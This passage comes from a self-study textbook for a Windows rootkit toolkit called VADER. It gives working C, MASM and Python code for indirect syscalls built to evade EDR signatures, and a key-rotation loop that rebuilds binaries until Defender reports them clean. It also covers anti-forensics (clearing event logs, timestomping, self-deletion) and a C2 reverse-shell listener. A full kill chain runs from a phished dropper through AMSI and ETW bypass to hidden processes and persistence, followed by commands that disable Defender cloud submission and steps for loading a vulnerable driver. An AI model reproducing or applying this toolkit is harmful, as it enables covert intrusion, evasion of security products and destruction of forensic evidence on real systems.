YOUR CODE → NtAllocateVirtualMemory (hooked) → EDR INSPECTION → Original Function → Kernel
```

**Indirect syscalls bypass this entirely.** Instead of calling the ntdll function (which is hooked), we execute the `syscall` instruction ourselves, using the correct SSN.

```
YOUR CODE → our MASM stub → syscall instruction → Kernel
```

The EDR's hook never fires because we never touch the hooked function.

### 16.2 — Hell's Gate: Extracting SSNs

SSNs (System Service Numbers) change between Windows builds. We can't hardcode them. Hell's Gate dynamically extracts SSNs by reading the NT stub bytes:

```c
static BOOL is_clean_stub(BYTE *addr) {
    // Check for standard NT stub prologue
    return (addr[0] == 0x4C &&   // mov r10, rcx
            addr[1] == 0x8B &&
            addr[2] == 0xD1 &&
            addr[3] == 0xB8);    // mov eax, <SSN>
}

static DWORD extract_ssn(BYTE *addr) {
    // SSN is at bytes 4-5 (little-endian WORD)
    return ((DWORD)addr[5] << 8) | (DWORD)addr[4];
}
```

If the stub is clean (not hooked by EDR), we read the SSN directly. If it's hooked (first bytes are a JMP), we use Halo's Gate.

### 16.3 — Halo's Gate: SSN Recovery from Hooked Stubs

When a stub is hooked, we can't read its SSN. But neighboring stubs might be clean. Nt* functions are sorted by SSN in ntdll's export table, so:

- If `NtAllocateVirtualMemory` is hooked (SSN unknown)
- But `NtAllocateUserPhysicalPages` (SSN = X) is clean (1 position down)
- Then `NtAllocateVirtualMemory` SSN = X - 1

```c
#define HALO_RADIUS 20

static BOOL halo_gate(EXPORT_CTX *ctx, DWORD target_idx, SYSCALL_ENTRY *entry) {
    for (int delta = 1; delta <= HALO_RADIUS; delta++) {
        // Check neighbor above
        if (target_idx + delta < ctx->count) {
            BYTE *neighbor = ctx->base + ctx->funcs[ctx->ordinals[target_idx + delta]];
            if (is_clean_stub(neighbor)) {
                entry->ssn = extract_ssn(neighbor) - delta;
                entry->syscall_addr = find_syscall_ret(neighbor);
                return TRUE;
            }
        }
        // Check neighbor below
        if (target_idx >= (DWORD)delta) {
            BYTE *neighbor = ctx->base + ctx->funcs[ctx->ordinals[target_idx - delta]];
            if (is_clean_stub(neighbor)) {
                entry->ssn = extract_ssn(neighbor) + delta;
                entry->syscall_addr = find_syscall_ret(neighbor);
                return TRUE;
            }
        }
    }
    return FALSE;
}
```

### 16.4 — The Gadget: syscall;ret

We don't execute our own `syscall` instruction — that would be signatured. Instead, we borrow one from a clean ntdll stub:

```c
static void *find_syscall_ret(BYTE *addr) {
    for (int i = 0; i < 32; i++) {
        if (addr[i] == 0x0F && addr[i+1] == 0x05 && addr[i+2] == 0xC3)
            return &addr[i];  // Found: syscall (0F 05) ; ret (C3)
    }
    return NULL;
}
```

This `syscall;ret` address is our "gadget." We set EAX to the SSN, set R10 to the first parameter, and JMP to this gadget. The syscall executes in the context of a legitimate ntdll address — EDR call stacks look normal.

### 16.5 — Gadget Pool Rotation

Using the same gadget for every syscall creates a pattern. Our v2 engine collects all available `syscall;ret` gadgets from every clean Nt* stub and rotates between them:

```c
static void collect_gadget_pool(EXPORT_CTX *ctx, GATE_TABLE *table) {
    table->global_pool_count = 0;
    for (DWORD i = 0; i < ctx->count && table->global_pool_count < 32; i++) {
        char *name = (char *)(ctx->base + ctx->names[i]);
        if (name[0] == 'N' && name[1] == 't') {
            BYTE *addr = ctx->base + ctx->funcs[ctx->ordinals[i]];
            if (is_clean_stub(addr)) {
                void *gadget = find_syscall_ret(addr);
                if (gadget)
                    table->global_gadgets[table->global_pool_count++] = gadget;
            }
        }
    }
}
```

Each syscall uses a different gadget — EDR profiling tools can't correlate a single gadget address to a specific function.

### 16.6 — The MASM Stub (Obfuscated)

The assembly stub that actually performs the indirect syscall:

```asm
.data
    g_ssn_v2           DWORD 0
    g_syscall_addr_v2  QWORD 0
    g_ssn_mask         DWORD 05A5Ah   ; XOR mask for SSN obfuscation

.code

SetSyscallV2 PROC
    xor ecx, g_ssn_mask        ; store SSN XOR'd (never plaintext in memory)
    mov g_ssn_v2, ecx
    mov g_syscall_addr_v2, rdx
    ret
SetSyscallV2 ENDP

IndirectSyscallV2 PROC
    ; r10 = rcx (non-standard encoding to avoid signature)
    push rcx
    pop r10

    ; Load and unmask SSN
    mov eax, g_ssn_v2
    xor eax, g_ssn_mask

    ; Jump to gadget via push/ret (not jmp [mem])
    mov r11, g_syscall_addr_v2
    push r11
    ret     ; lands on syscall;ret in ntdll
IndirectSyscallV2 ENDP
```

**Why push/pop instead of mov r10, rcx?**
The standard sequence `4C 8B D1 B8 XX XX XX XX` (mov r10,rcx; mov eax,ssn) is widely signatured by EDR as an indirect syscall stub. Our push/pop sequence has different opcodes (`51 41 5A`) that don't match the signature.

**Why push/ret instead of jmp?**
The standard `FF 25` (jmp [rip+disp]) is another signatured pattern. Push/ret (`41 53 C3`) achieves the same result — transferring control to the gadget address — with completely different bytes.

### 16.7 — XOR-Encrypted Hash Constants

Function names are identified by DJB2 hash, not plaintext strings:

```c
// DJB2 hash function
DWORD gate_hash(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

// Hash for "NtAllocateVirtualMemory" = 0x33BC1FBB (example)
// XOR with 0xDCDCDCDC (gate key repeated) = encrypted constant
```

The encrypted constants are stored in the binary. At runtime, they're decrypted and compared against hashes computed from ntdll export names. This prevents strings like "NtAllocateVirtualMemory" from appearing anywhere in the binary.

### 16.8 — Exercise: Hash Computation

Write a program that computes DJB2 hashes for all Nt* exports:

```c
#include <windows.h>
#include <stdio.h>

DWORD djb2(const char *str) {
    DWORD h = 5381;
    int c;
    while ((c = *str++)) h = ((h << 5) + h) + c;
    return h;
}

int main(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    // Walk export table and print hash for each Nt* function
    // Compare with the encrypted constants in gate_v2.h
    return 0;
}
```

---

## Chapter 17: Polymorphic Mutation

### 17.1 — Why Every Build Must Be Unique

Cloud-based AV analysis works by submitting samples to Microsoft's servers. If your binary is submitted and flagged, that exact sequence of bytes is signatured. But if every build is different — different XOR keys, different encoded strings, different byte patterns — cloud signatures don't transfer.

### 17.2 — The Mutation Pipeline

`mutate.py` automates the process:

1. **Parse** — Find `#define XOR_KEY 0xXX` and all XOR-encoded arrays in the source
2. **Generate** — Random new key (0x80-0xFF range, never same as current)
3. **Re-encode** — Decrypt arrays with old key, re-encrypt with new key
4. **Update** — Replace key constant, array contents, and inline XOR references
5. **Compile** — Build the new binary with MSVC
6. **Scan** — Run Defender scan on the output
7. **Loop** — If detected, rotate again (up to 10 attempts)

### 17.3 — Core Algorithm

```python
def re_encode_array(raw_bytes, old_key, new_key):
    # Decrypt with old key to get plaintext
    plaintext = [(b ^ old_key) & 0xFF for b in raw_bytes]
    # Re-encrypt with new key
    return [(b ^ new_key) & 0xFF for b in plaintext]

def gen_new_key(current_key):
    while True:
        k = secrets.randbelow(0x7F) + 0x80  # 0x80-0xFF range
        if k != current_key:
            return k
```

### 17.4 — Component Registry

mutate.py knows about every component in the VADER toolkit:

```python
COMPONENTS = {
    "dark_room": {
        "source": "dark_room/dark_room_annotated.c",
        "binary": "dark_room.exe",
        "key_define": "XOR_KEY",
        "compile_flags": "/Fe:dark_room.exe /O1 /GS-",
    },
    "shell": {
        "source": "shell/vader_shell_annotated.c",
        "binary": "vader_shell.exe",
        "key_define": "XOR_KEY",
        "compile_flags": "/Fe:vader_shell.exe /O1 /GS-",
        "link_libs": "ws2_32.lib",
    },
    # ... more components ...
}
```

### 17.5 — The Rotate-Until-Clean Loop

```python
def rotate_component(name, comp):
    backup = open(comp["source"]).read()  # save original

    for attempt in range(1, 11):
        old_key, new_key = mutate_source(comp["source"], comp["key_define"])
        if not compile_component(comp):
            restore(comp["source"], backup)
            return False

        scan_result = scan_binary(comp["binary"])
        if scan_result == "CLEAN":
            print(f"[+] {name}: CLEAN at key 0x{new_key:02X} (attempt {attempt})")
            return True

        print(f"[~] DETECTED at 0x{new_key:02X} — rotating again...")

    # All 10 attempts detected — restore original
    restore(comp["source"], backup)
    return False
```

### 17.6 — Exercise: Manual Key Rotation

1. Note the current XOR key: `python mutate.py --status`
2. Rotate a single component: `python mutate.py --target dark_room`
3. Verify the key changed: `python mutate.py --status`
4. Build and scan: `python cloak/build_cloak.py --scan`

---

# PART VI: POST-OPERATION

---

## Chapter 18: Anti-Forensics

### 18.1 — Evidence We Leave Behind

Every VADER operation creates forensic artifacts:

| Artifact | Location | Evidence Of |
|----------|----------|-------------|
| Canary files | `C:\Windows\Temp\*.log` | Component execution |
| Event logs | PowerShell/Operational, Sysmon, Security | Script execution, process creation |
| Prefetch files | `C:\Windows\Prefetch\VADER_*.pf` | Program execution history |
| File timestamps | Modified dates on deployed files | When files were created/modified |
| The cleanup tool itself | Wherever vader_clean.exe was run | That cleanup occurred |

### 18.2 — The Five Phases of Cleanup

`vader_clean.exe` executes five cleanup phases:

**Phase 1: Canary File Deletion**
Deletes all known canary/evidence files. Standard user permissions suffice for `C:\Windows\Temp` (world-writable).

**Phase 2: Event Log Clearing**
Uses `EvtClearLog` from `wevtapi.dll` to clear PowerShell, Sysmon, Security, and Application logs. Requires admin/SYSTEM.

**Phase 3: Prefetch Cleanup**
Deletes `.pf` files in `C:\Windows\Prefetch` that match VADER binary names. Requires admin/SYSTEM.

**Phase 4: Timestomping**
Copies timestamps from `kernel32.dll` (a legitimate system file) to deployed files. Makes them look like they were created when Windows was installed, not yesterday.

```c
// Get timestamps from kernel32.dll
HANDLE hRef = CreateFileA("C:\\Windows\\System32\\kernel32.dll",
    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
FILETIME ftCreate, ftAccess, ftWrite;
GetFileTime(hRef, &ftCreate, &ftAccess, &ftWrite);
CloseHandle(hRef);

// Apply to our deployed file
HANDLE hTarget = CreateFileA(targetPath,
    FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite);
CloseHandle(hTarget);
```

**Phase 5: Self-Delete**
Schedules its own binary for deletion on next reboot:

```c
MoveFileExA(selfPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
```

### 18.3 — XOR Encoding in the Cleanup Tool

Even the cleanup tool uses XOR encoding (key 0x93, callsign JULIET) for all file paths and log channel names. Defender's static engine can't see which files or logs the tool targets.

### 18.4 — Exercise: Dry Run

Run the cleanup tool in dry-run mode to see what it would delete without making changes:

```
vader_clean.exe --dry-run
```

This shows every artifact it would clean, which logs it would clear, and which prefetch files it would delete — without touching anything.

---

## Chapter 19: C2 Infrastructure

### 19.1 — The Listener

The C2 listener is a Python script that receives connections from deployed shells:

```python
import socket
import sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", PORT))
srv.listen(5)

print(f"[+] Listening on 0.0.0.0:{PORT}")

while True:
    conn, addr = srv.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    try:
        while True:
            data = conn.recv(4096).decode(errors="replace")
            if not data: break
            print(data, end="", flush=True)
            cmd = input()
            if cmd == "exit":
                conn.send(b"exit\n")
                break
            conn.send((cmd + "\n").encode())
    except Exception:
        pass
    conn.close()
```

### 19.2 — Notification Listener

Separate from the shell listener, the notification listener receives callbacks from the dropper:

```python
# Runs on port 53683
# Receives: "HOSTNAME|CLOAK_STATUS|SHELL_PORT"
# Example:  "DESKTOP-ABC|1|4444"
```

This tells the operator:
- Which machine was compromised
- Whether the cloak deployed successfully
- Which port to connect to for the shell

### 19.3 — Screen Capture Reception

When the operator types `screen` in the shell, raw BMP data streams back. The listener saves it to disk:

```python
if data.startswith("[SCREEN]"):
    bmp_data = data.split("[SCREEN]")[1].split("[/SCREEN]")[0]
    import base64
    with open(f"screen_{timestamp}.bmp", "wb") as f:
        f.write(base64.b64decode(bmp_data))
    print("[+] Screenshot saved")
```

---

# PART VII: FIELD OPERATIONS

---

## Chapter 20: The Complete Kill Chain

### 20.1 — Operation Sequence

From zero to full compromise, one click:

```
OPERATOR MACHINE                          TARGET MACHINE
─────────────────                         ──────────────
1. python c2_listen.py 53683              (notification listener)
2. python c2_listen.py 4444               (shell listener)
3. Deliver vader_dropper.exe              (USB / phishing / physical)
                                          4. User double-clicks
                                          5. Sandbox check passes
                                          6. APIs resolved dynamically
                                          7. Dark Room activates
                                          8.   DR0 → AmsiScanBuffer
                                          9.   DR1 → EtwEventWrite
                                          10. Cloak deployed
                                          11.   Process hooks installed
                                          12.   File hooks installed
                                          13.   Connection hooks installed
                                          14.   CBT hook → system-wide
                                          15. Persistence installed
                                          16.   HKCU Run key
                                          17.   Startup folder shortcut
                                          18. C2 notification sent ──────→  "DESKTOP-X|1|4444"
                                          19. Shell connects back ───────→  PS C:\Users\target>
                                          20. Process invisible in Task Manager
                                          21. Files invisible in Explorer
                                          22. Connection invisible in netstat
```

### 20.2 — Operational Security

- **Change the C2 IP** in the dropper source before every engagement
- **Rotate XOR keys** with `python mutate.py` before every build
- **Test against Defender** with `python cloak/build_cloak.py --scan`
- **Use ghost encoding** for any PowerShell payloads
- **Run vader_clean.exe** after the operation

### 20.3 — Exercise: Full Chain Test (Local)

On your own machine:
1. Start both listeners (notification + shell)
2. Build the dropper pointing to 127.0.0.1
3. Run `python mutate.py` to get fresh keys
4. Run `python cloak/build_cloak.py --scan` to verify clean
5. Execute the dropper
6. Verify notification received
7. Verify shell connected
8. Run `screen` command — verify screenshot captured
9. Open Task Manager — verify process hidden
10. Run `netstat -ano | findstr 4444` — verify connection hidden
11. Run `vader_clean.exe --dry-run` to see what would be cleaned

---

## Chapter 21: Defender Analysis and Battle Drills

### 21.1 — Understanding Detection Layers

When Defender catches something, the FIRST question is: **which layer caught it?**

| Symptom | Layer | Counter |
|---------|-------|---------|
| `build_cloak.py --scan` says DETECTED | Static signature | `python mutate.py` (rotate keys) |
| "This script contains malicious content" | AMSI | Check Dark Room is running (DR0) |
| Defender responds to invisible actions | ETW telemetry | Check ETW hook is active (DR1) |
| Binary scans clean but gets killed at runtime | Behavioral heuristic | Jitter, reorder, split, indirect syscalls |
| Local scan passes, cloud verdict dirty | Cloud analysis | Disable cloud submit, rotate keys |

### 21.2 — Battle Drill Scenarios

**Scenario 1: Static Signature**
```
python mutate.py --rotate-keys
python cloak/build_cloak.py --scan
```
New XOR keys shift every byte. Infinite variants. 30 seconds.

**Scenario 2: AMSI Block**
Dark Room handles this automatically. DR0 on AmsiScanBuffer returns E_INVALIDARG before AMSI ever scans. They can add a million patterns — the function never executes.

**Scenario 3: ETW Flags Behaviour**
DR1 on EtwEventWrite. All events return 0 but write nothing. New ETW channels still flow through EtwEventWrite — one hook catches them all.

**Scenario 4: Behavioral Heuristic (the hard one)**
Options:
1. Add timing jitter: `Sleep(rand() % 3000 + 1000)` between API calls
2. Reorder operations
3. Split across processes
4. Use indirect syscalls (Gate Engine)
5. Change API resolution paths

**Scenario 5: Cloud Verdict**
```powershell
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
```
mutate.py makes every build unique. Cloud signatures are per-sample.

### 21.3 — The 0x1security Methodology

When none of the above works:

1. **Search for knowledge, not bugs.** Understand WHY Defender caught it.
2. **See the path.** What was the detection vector?
3. **See the block.** What specific check identified you?
4. **Find the substitute.** Same outcome, different technique.
5. **Crash → Leak → Execute.** Make the security product fail, extract what it knows, act on it.

The specific exploit changes. The methodology doesn't.

---

## Chapter 22: MITRE ATT&CK Mapping

Every technique in this course maps to the MITRE ATT&CK framework:

| Technique | ATT&CK ID | Chapter |
|-----------|-----------|---------|
| XOR-encoded strings | T1027 — Obfuscated Files | 3 |
| Dynamic API resolution | T1106 — Native API | 3 |
| AMSI bypass (HWBP) | T1562.001 — Disable Security Tools | 4 |
| ETW bypass (HWBP) | T1562.001 — Disable Security Tools | 5 |
| Steganographic encoding | T1027.003 — Steganography | 6 |
| Inline hooking | T1574.001 — DLL Search Order | 7 |
| Process hiding | T1564.001 — Hidden Files and Dirs | 8 |
| File hiding | T1564.001 — Hidden Files and Dirs | 9 |
| Connection hiding | T1205 — Traffic Signaling | 10 |
| DLL injection | T1055.001 — DLL Injection | 12 |
| Reverse shell | T1059.001 — PowerShell / T1071 — App Layer Protocol | 13 |
| Screen capture | T1113 — Screen Capture | 13 |
| Registry Run key | T1547.001 — Registry Run Keys | 14 |
| Startup folder | T1547.001 — Registry Run Keys | 14 |
| Indirect syscalls | T1106 — Native API | 16 |
| Polymorphic mutation | T1027.001 — Binary Padding | 17 |
| Event log clearing | T1070.001 — Clear Windows Event Logs | 18 |
| Prefetch cleanup | T1070.004 — File Deletion | 18 |
| Timestomping | T1070.006 — Timestomp | 18 |
| Self-deletion | T1070.004 — File Deletion | 18 |

---

## Chapter 23: Theory — Kernel-Level Rootkits (BYOVD)

### 23.1 — The Limitation of User-Mode

Everything we've built operates in Ring 3 (user mode). Our hooks live in each process's copy of ntdll.dll. A kernel-mode tool could query the kernel directly and see through our concealment.

Enterprise EDR products (CrowdStrike, SentinelOne) have kernel drivers that do exactly this. Windows Defender Home (consumer) does not — which is why our user-mode rootkit works against it.

### 23.2 — Bring Your Own Vulnerable Driver (BYOVD)

To achieve kernel-level concealment, you need a kernel driver. Modern Windows requires drivers to be signed. BYOVD exploits a signed, legitimate driver that has a known vulnerability allowing arbitrary kernel read/write.

**Example: RTCore64.sys (MSI Afterburner)**
- Legitimately signed by MSI
- CVE-2019-16098: Arbitrary kernel memory read/write via IOCTL
- Still distributed with MSI Afterburner

The attack:
1. Load the signed driver: `sc create rtcore binPath= "rtcore64.sys" type= kernel`
2. Open the device: `CreateFile("\\\\.\\RTCore64", ...)`
3. Use IOCTL to read/write kernel memory
4. Find the target process's EPROCESS structure
5. Unlink it from the `ActiveProcessLinks` doubly-linked list
6. Process is now invisible at the kernel level — nothing in user mode can see it

### 23.3 — EPROCESS Manipulation

```
EPROCESS (kernel structure)
├── ActiveProcessLinks (LIST_ENTRY)
│   ├── Flink → Next EPROCESS
│   └── Blink → Previous EPROCESS
├── ImageFileName
├── UniqueProcessId
└── ... many more fields
```

To hide process X:
```
Before: A ←→ X ←→ B
After:  A ←→ B     (X still runs but is unlisted)

X->Flink = X  (points to self)
X->Blink = X  (points to self)
A->Flink = B
B->Blink = A
```

The process keeps running (its threads are scheduled normally) but no kernel query can find it.

**This is beyond the scope of practical exercises** — kernel manipulation can blue-screen the machine. It's documented here as theoretical knowledge for your CSEC studies.

---

# APPENDICES

---

## Appendix A: Build Reference

### Complete Build Commands

```batch
:: Set up MSVC environment
call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"

:: Dark Room
cl.exe dark_room\dark_room_annotated.c /Fe:dark_room\dark_room.exe /O1 /GS-

:: Reverse Shell
cl.exe shell\vader_shell.c /Fe:shell\vader_shell.exe /O1 /GS- /utf-8 /link ws2_32.lib

:: Process Injector
cl.exe injection\vader_inject.c /Fe:injection\vader_inject.exe /O1 /GS- /utf-8

:: Cloak DLL
cl.exe cloak\cloak.c cloak\hook_engine.c cloak\hide_process.c cloak\hide_file.c cloak\hide_connection.c /Fe:cloak\cloak.dll /LD /O1 /GS- /utf-8

:: Anti-Forensics
cl.exe forensics\vader_clean_annotated.c /Fe:forensics\vader_clean.exe /O1 /GS- /utf-8 /link advapi32.lib

:: Gate Engine v2 (Indirect Syscalls)
ml64.exe /c src\gate_stub_v2.asm /Fo:gate_stub_v2.obj
cl.exe src\gate_v2.c src\test_gate_v2.c gate_stub_v2.obj /Fe:test_gate_v2.exe /O1 /GS- /utf-8

:: Dropper (full kill chain)
cl.exe cloak\vader_dropper.c /Fe:vader_dropper.exe /O1 /GS- /utf-8 /link ws2_32.lib
```

### Python Tools

```bash
# Ghost Encoder
python ghost_encode.py --vader <IP> <PORT> -o ghost.ps1
python ghost_encode.py --test -o test.ps1
python ghost_encode.py --verify ghost.ps1

# Mutation Pipeline
python mutate.py                        # rotate all components
python mutate.py --target dark_room     # single component
python mutate.py --dry-run              # preview changes
python mutate.py --status               # show current keys

# Build + Scan
python cloak/build_cloak.py --scan

# C2 Listeners
python cloak/c2_listen.py 53683         # notification listener
python cloak/c2_listen.py 4444          # shell listener
```

---

## Appendix B: Tool Quick Reference

| Tool | Command | What It Does |
|------|---------|-------------|
| Dark Room | `dark_room.exe` | HWBP AMSI/ETW bypass |
| Ghost Encoder | `python ghost_encode.py` | Zero-width Unicode encoding |
| Cloak DLL | Loaded by dropper/injector | Process/file/connection hiding |
| Injector | `vader_inject.exe <PID\|--spawn>` | DLL injection |
| Shell | `vader_shell.exe` | Reverse shell with screen capture |
| Dropper | `vader_dropper.exe` | Single-click full kill chain |
| Gate Engine | `test_gate_v2.exe` | Indirect syscall verification |
| Mutation | `python mutate.py` | XOR key rotation + rebuild |
| Cleanup | `vader_clean.exe` | Anti-forensics (5 phases) |
| C2 Listener | `python c2_listen.py` | Receive callbacks/shells |

---

## Appendix C: Repository Map

```
vader-rootkit/          — Main rootkit repository
├── dark_room/          — AMSI/ETW hardware breakpoint bypass
├── cloak/              — Concealment layer (hooks + dropper)
│   ├── cloak.h         — What to hide (config)
│   ├── cloak.c         — DLL entry point + CBT export
│   ├── hook_engine.c/h — x64 inline hook engine
│   ├── hide_process.c  — NtQuerySystemInformation hook
│   ├── hide_file.c     — NtQueryDirectoryFile hook
│   ├── hide_connection.c — GetExtendedTcpTable hook
│   ├── vader_dropper.c — Single-click kill chain
│   └── c2_listen.py    — C2 notification listener
├── shell/              — Reverse shell
├── injection/          — Process injector
├── forensics/          — Anti-forensics cleanup
├── mutate.py           — Polymorphic mutation pipeline
└── TEXTBOOK.md         — This file

ghost-encoder/          — Steganographic payload encoder
├── ghost_encode.py     — Main encoder tool
└── README.md

sith-stalker/           — Indirect syscall engine
├── src/
│   ├── gate_v2.c/h     — Fused gate engine (Hell's + Halo's Gate)
│   ├── gate_stub_v2.asm — Obfuscated MASM stubs
│   └── test_gate_v2.c  — Verification harness
└── README.md
```

---

## Appendix D: XOR Key Reference

| Component | Key Name | Current Value | Callsign |
|-----------|----------|---------------|----------|
| Dropper | XOR_KEY | 0xB5 | — |
| Dropper | SHELL_XOR_KEY | 0xBE | — |
| Injector | XK | 0xAC | — |
| Anti-Forensics | — | 0x93 | JULIET |
| Shell | XOR_KEY | 0xFC | — |
| Gate Engine v2 | GATE_XOR_KEY | 0xDC | — |

All keys are rotatable by `mutate.py`.

---

## Appendix E: Complete Exercises

### Beginner
1. (Ch 1) PEB walk — enumerate loaded modules
2. (Ch 2) Build verification — compile and run test program
3. (Ch 3) XOR encoder — Python script generating C code

### Intermediate
4. (Ch 4) Dark Room — compile and verify AMSI bypass
5. (Ch 6) Ghost encode — encode and execute a test payload
6. (Ch 7) Hook MessageBoxA — inline hook with trampoline
7. (Ch 8) Process visibility test — hide notepad from Task Manager
8. (Ch 9) File visibility test — hide a file from dir
9. (Ch 10) Connection visibility test — hide from netstat

### Advanced
10. (Ch 12) DLL injection — inject test DLL into Notepad
11. (Ch 13) Local shell test — reverse shell to localhost
12. (Ch 16) Hash computation — DJB2 hashes for NT exports
13. (Ch 17) Manual key rotation — mutate and verify

### Final Exam
14. (Ch 20) Full chain test — complete kill chain on localhost

---

## Appendix F: Glossary

| Term | Definition |
|------|-----------|
| AMSI | Antimalware Scan Interface — runtime script scanning |
| CBT Hook | Computer-Based Training hook — window event callback |
| DR0-DR3 | x64 debug registers — hardware breakpoint addresses |
| DJB2 | Dan Bernstein's hash function (seed 5381) |
| EDR | Endpoint Detection and Response |
| ETW | Event Tracing for Windows — kernel telemetry |
| EPROCESS | Kernel structure representing a process |
| Gadget | A `syscall;ret` instruction pair borrowed from ntdll |
| Halo's Gate | SSN recovery from hooked stubs via neighbor analysis |
| Hell's Gate | Dynamic SSN extraction from clean ntdll stubs |
| IAT | Import Address Table — lists functions a binary imports |
| IOCTL | I/O Control — device driver communication mechanism |
| MASM | Microsoft Macro Assembler (ml64.exe) |
| MIB_TCPROW | Management Information Base TCP row — one connection |
| MSRC | Microsoft Security Response Center |
| NT Stub | System call stub in ntdll.dll |
| PEB | Process Environment Block — process metadata |
| PE | Portable Executable — Windows binary format |
| SSN | System Service Number — kernel function identifier |
| Trampoline | Executable buffer: saved bytes + JMP back to original |
| VEH | Vectored Exception Handling — first-chance exception handler |
| XOR | Exclusive OR — reversible single-key cipher |

---

*22DIV / VADER / george wu*

*"The specific exploit changes. The methodology doesn't."*

---

# END OF TEXTBOOK

**Total Chapters:** 23
**Total Appendices:** 6
**Techniques Covered:** 20+ (mapped to MITRE ATT&CK)
**Source Files Referenced:** 15+
**Exercises:** 14

This is your curriculum. Study it. Build every tool. Break your own machines. Walk into Cert IV Cybersecurity knowing you've already done what they're going to teach you to understand.

*— George Wu, 22DIV*
